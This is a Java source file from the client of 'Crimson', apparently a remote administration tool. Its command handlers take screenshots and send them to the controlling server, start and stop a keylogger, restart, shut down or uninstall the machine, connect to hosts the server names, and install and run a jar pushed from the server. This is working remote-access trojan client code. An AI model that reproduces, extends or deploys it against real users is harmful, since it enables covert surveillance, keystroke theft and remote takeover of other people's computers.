package com.subterranean_security.crimson.client.exe;

import java.awt.HeadlessException;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.net.ConnectException;

import javax.imageio.ImageIO;

import org.jnativehook.NativeHookException;

import com.google.protobuf.ByteString;
import com.subterranean_security.crimson.client.modules.Keylogger;
import com.subterranean_security.crimson.client.modules.Power;
import com.subterranean_security.crimson.client.modules.QuickScreenshot;
import com.subterranean_security.crimson.client.store.ConfigStore;
import com.subterranean_security.crimson.core.misc.HCP;
import com.subterranean_security.crimson.core.net.Connector;
import com.subterranean_security.crimson.core.net.Connector.Config;
import com.subterranean_security.crimson.core.net.executor.temp.ExeI;
import com.subterranean_security.crimson.core.net.executor.temp.Exelet;
import com.subterranean_security.crimson.core.store.LcvidStore;
import com.subterranean_security.crimson.core.store.NetworkStore;
import com.subterranean_security.crimson.core.stream.Stream;
import com.subterranean_security.crimson.core.stream.StreamStore;
import com.subterranean_security.crimson.core.util.FileUtil;
import com.subterranean_security.crimson.core.util.TempUtil;
import com.subterranean_security.crimson.proto.core.Generator.ClientConfig;
import com.subterranean_security.crimson.proto.core.Misc.Outcome;
import com.subterranean_security.crimson.proto.core.net.sequences.ClientControl.RS_ChangeSetting;
import com.subterranean_security.crimson.proto.core.net.sequences.Keylogger.State;
import com.subterranean_security.crimson.proto.core.net.sequences.Log.LogFile;
import com.subterranean_security.crimson.proto.core.net.sequences.Log.LogType;
import com.subterranean_security.crimson.proto.core.net.sequences.Log.RS_Logs;
import com.subterranean_security.crimson.proto.core.net.sequences.MSG.Message;
import com.subterranean_security.crimson.proto.core.net.sequences.Network.RQ_MakeDirectConnection;
import com.subterranean_security.crimson.proto.core.net.sequences.Screenshot.RS_QuickScreenshot;
import com.subterranean_security.crimson.proto.core.net.sequences.State.RS_ChangeClientState;
import com.subterranean_security.crimson.proto.core.net.sequences.Update.RS_GetClientConfig;
import com.subterranean_security.crimson.sc.Logsystem;

public class MiscExe extends Exelet implements ExeI {

	public MiscExe(Connector connector) {
		super(connector);
	}

	public void rq_direct_connection(Message m) {
		RQ_MakeDirectConnection rq = m.getRqMakeDirectConnection();
		Connector connector = new Connector(getInstanceExecutor());
		try {
			connector.connect(Config.ConnectionType.DATAGRAM, rq.getHost(), rq.getPort());
		} catch (ConnectException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

	public void ev_stream_data(Message m) {
		Stream s = StreamStore.getStream(m.getEvStreamData().getStreamID());
		if (s != null) {
			s.received(m);
		}

	}

	public void ev_endpoint_closed(Message m) {
		// remove half-open streams
		StreamStore.removeStreamsByCVID(m.getEvEndpointClosed().getCVID());
	}

	public void ev_chat_message(Message m) {

	}

	public void rq_change_client_state(Message m) {
		log.debug("Received state change request: {}", m.getRqChangeClientState().getNewState().toString());
		Outcome outcome = null;

		switch (m.getRqChangeClientState().getNewState()) {
		case RESTART:
			outcome = Power.restart();
			break;
		case SHUTDOWN:
			outcome = Power.shutdown();
			break;
		case HIBERNATE:
			outcome = Power.hibernate();
			break;
		case STANDBY:
			outcome = Power.standby();
			break;
		case UNINSTALL:
			outcome = Power.uninstall();
			break;
		case RESTART_PROCESS:
			outcome = Power.restartProcess();
			break;
		case KILL:
			outcome = Outcome.newBuilder().setResult(true).build();
			break;

		default:
			return;
		}

		if (outcome != null) {
			connector.write(Message.newBuilder().setId(m.getId()).setRid(m.getSid())
					.setRsChangeClientState(RS_ChangeClientState.newBuilder().setOutcome(outcome)).build());

		}

		if (outcome.getResult()) {
			System.exit(0);
		}

	}

	public void rq_get_client_config(Message m) {
		NetworkStore.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(LcvidStore.cvid)
				.setRsGetClientConfig(RS_GetClientConfig.newBuilder().setConfig(ConfigStore.getConfig())));
	}

	public void rs_generate(Message m) {
		// TODO flush any pending data

		// update client
		File temp = TempUtil.getDir();
		try {
			FileUtil.writeFile(m.getRsGenerate().getInstaller().toByteArray(),
					new File(temp.getAbsolutePath() + "/installer.jar"));

			HCP.update(new File(temp.getAbsolutePath() + "/installer.jar").getAbsolutePath(), new String[] {},
					new String[] {}, 2);
			System.exit(0);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public void rq_quick_screenshot(Message m) {
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		try {
			ImageIO.write(QuickScreenshot.snap(), "jpg", baos);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return;
		}
		NetworkStore.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(LcvidStore.cvid)
				.setRsQuickScreenshot(RS_QuickScreenshot.newBuilder().setBin(ByteString.copyFrom(baos.toByteArray()))));
		try {
			baos.close();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public void rq_logs(Message m) {
		RS_Logs.Builder rs = RS_Logs.newBuilder();
		if (m.getRqLogs().hasLog()) {
			rs.addLog(LogFile.newBuilder().setName(m.getRqLogs().getLog())
					.setLog(Logsystem.getLog(m.getRqLogs().getLog())));
		} else {
			for (LogType lt : Logsystem.getApplicableLogs()) {
				rs.addLog(LogFile.newBuilder().setName(lt).setLog(Logsystem.getLog(lt)));
			}
		}
		NetworkStore
				.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(LcvidStore.cvid).setRsLogs(rs));
	}

	public void rq_change_setting(Message m) {
		Outcome.Builder outcome = Outcome.newBuilder().setResult(true);
		try {
			if (m.getRqChangeSetting().hasKeyloggerState()) {
				if (m.getRqChangeSetting().getKeyloggerState() == State.ONLINE) {
					try {
						Keylogger.start(ConfigStore.getConfig().getKeyloggerFlushMethod(),
								ConfigStore.getConfig().getKeyloggerFlushValue());
					} catch (HeadlessException e) {
						outcome.setResult(false).setComment("HeadlessException");
						return;
					} catch (NativeHookException e) {
						outcome.setResult(false).setComment(e.getMessage());
						return;
					}
				} else {
					Keylogger.stop();
				}
			}
			if (m.getRqChangeSetting().hasFlushMethod()) {
				ConfigStore.updateConfig(
						ClientConfig.newBuilder().setKeyloggerFlushMethod(m.getRqChangeSetting().getFlushMethod()));
				ConfigStore.saveIC();
			}
			if (m.getRqChangeSetting().hasFlushValue()) {
				ConfigStore.updateConfig(
						ClientConfig.newBuilder().setKeyloggerFlushValue(m.getRqChangeSetting().getFlushValue()));
				ConfigStore.saveIC();
			}
			if (m.getRqChangeSetting().hasFlushMethod() || m.getRqChangeSetting().hasFlushValue()) {
				try {
					Keylogger.start(ConfigStore.getConfig().getKeyloggerFlushMethod(),
							ConfigStore.getConfig().getKeyloggerFlushValue());
				} catch (HeadlessException e) {
					outcome.setResult(false).setComment("HeadlessException");
					return;
				} catch (NativeHookException e) {
					outcome.setResult(false).setComment(e.getMessage());
					return;
				}
			}
		} finally {
			NetworkStore.route(Message.newBuilder().setId(m.getId()).setRid(m.getSid()).setSid(LcvidStore.cvid)
					.setRsChangeSetting(RS_ChangeSetting.newBuilder().setResult(outcome)));
		}

	}

	public void rq_chat(Message m) {
		// TODO handle
	}

}
